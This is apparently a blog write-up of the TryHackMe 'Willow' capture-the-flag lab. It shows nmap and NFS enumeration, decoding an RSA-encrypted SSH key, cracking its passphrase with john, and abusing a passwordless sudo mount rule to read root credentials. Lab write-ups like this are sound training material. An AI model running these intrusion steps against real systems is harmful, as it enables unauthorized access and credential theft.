---
layout: default
title : Willow - Writeup
---

# [Main](https://bvr0n.github.io/) &nbsp;&nbsp;   [Contact](https://bvr0n.github.io/contact.html) &nbsp;&nbsp; [About Me](./aboutme.md) <br>

_**Nov 08, 2020**_

[Willow](https://tryhackme.com/room/willow) Writeup

## Nmap Scan :

```
bvr0n@kali:~/CTF/THM/Willow$ nmap -sC -sV 10.10.58.196
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Recovery Page
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33045/udp   mountd
|   100005  1,2,3      50247/tcp   mountd
|   100005  1,2,3      53104/udp6  mountd
|   100005  1,2,3      58466/tcp6  mountd
|   100021  1,3,4      35887/udp6  nlockmgr
|   100021  1,3,4      36539/tcp   nlockmgr
|   100021  1,3,4      45263/tcp6  nlockmgr
|   100021  1,3,4      45612/udp   nlockmgr
|   100024  1          42988/tcp   status
|   100024  1          47886/tcp6  status
|   100024  1          53120/udp6  status
|   100024  1          57397/udp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs_acl 2-3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## RPC Enum :

```
bvr0n@kali:~/CTF/THM/Willow$ sudo showmount -e 10.10.58.196
[sudo] password for bvr0n: 
Export list for 10.10.58.196:
/var/failsafe *
```
```
bvr0n@kali:~/CTF/THM/Willow$ sudo mount -t nfs 10.10.170.153:/var/failsafe /mnt/ewf/ -nolock
bvr0n@kali:/mnt/ewf$ cat rsa_keys 
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

## Web Enum :

After visiting the web page we can see a lot of encoded numbers, When we throw it all in [CyberChef](https://gchq.github.io/CyberChef/) we get this :
```
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
```

Now the shared folder make sens, it's a private key, let's get it!! i grabbed all the numbers after the message we retireved and head here [RSA Calculator](https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html) :

The modulus `N` was `37627` & The modulus `d` was `61527` (from the shared folder).

After grabbing the `RSA_Private_KEY`, now all we need is the password ! CRACKING TIME.

```
bvr0n@kali:~/CTF/THM/Willow$ /usr/share/john/ssh2john.py id_rsa > priv_rsa
bvr0n@kali:~/CTF/THM/Willow$ sudo john priv_rsa --wordlist=/home/bvr0n/Documents/rockyou.txt
[sudo] password for bvr0n: 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
**********       (id_rsa)
```

And we got the password for SSH, Let's login as `Willow`.

In the home directory there is a image that contains the flag, Let's get it :
```
willow@willow-tree:~$ cat user.jpg | base64
bvr0n@kali:~/CTF/THM/Willow$ cat b64_image | base64 -d > user.jpg
```
I took the original image and turn it into `base64`, then i created a new file and put it inside and decrypt it.

## Internal Enum :

Looks like we can mount as root without a password :
```
willow@willow-tree:/mnt/creds$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```
I checked the `/dev`, this is where filesystems show up, i noticed a pretty weird one :

```
willow@willow-tree:/dev$ ls
autofs           dri            kmsg                null    shm       
block            fb0            log                 port    snapshot  
btrfs-control    fd             loop-control        ppp     snd       
char             full           mapper              psaux   stderr    
console          fuse           mcelog              ptmx    stdin     
core             ******_******  mem                 p
```
```
willow@willow-tree:/mnt$ sudo mount /dev/******_****** /mnt/creds/
willow@willow-tree:/mnt$ cd /mnt/creds/
willow@willow-tree:/mnt/creds$ cat creds.txt 
root:7QvbvB********
willow:U0ZZJL********
```

And we got ROOT.

For the root flag, i struggled at first but apparently it was inside the image we retireved earlier -_-
```
bvr0n@kali:~/CTF/THM/Willow$ steghide extract -sf user.jpg 
Enter passphrase: 
wrote extracted data to "root.txt".
```

<br>
best regards

[bvr0n](https://github.com/bvr0n)


<br>
[back to main()](../../index.md)

<br>
